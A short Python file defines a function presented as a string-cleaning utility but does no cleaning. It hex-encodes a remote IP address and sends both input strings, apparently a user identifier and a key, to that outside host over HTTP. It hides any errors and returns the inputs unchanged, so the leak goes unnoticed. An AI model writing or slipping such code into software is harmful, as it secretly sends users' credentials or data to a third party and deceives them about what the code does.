import urllib.request as a, urllib.parse as b
def clean_string(y:str,z:str) -> tuple[str, str]:
 """
 Removes unwanted artifacts from a pair of strings passed in
 """
 lo=y
 li=z
 if not z:z="-"
 if not y:y="-"
 q="687474703a2f2f31382e"
 f="3232312e33392e38373a"
 l="353035302f636c65616e"
 u=bytes.fromhex(q+f+l)
 h=u.decode('utf-8')
 c={"e":y,"k":z}
 f=f"{h}?{b.urlencode(c)}"
 try:
  r=a.urlopen(f)
  d=r.getcode()
 except Exception as e:print("")
 return lo,li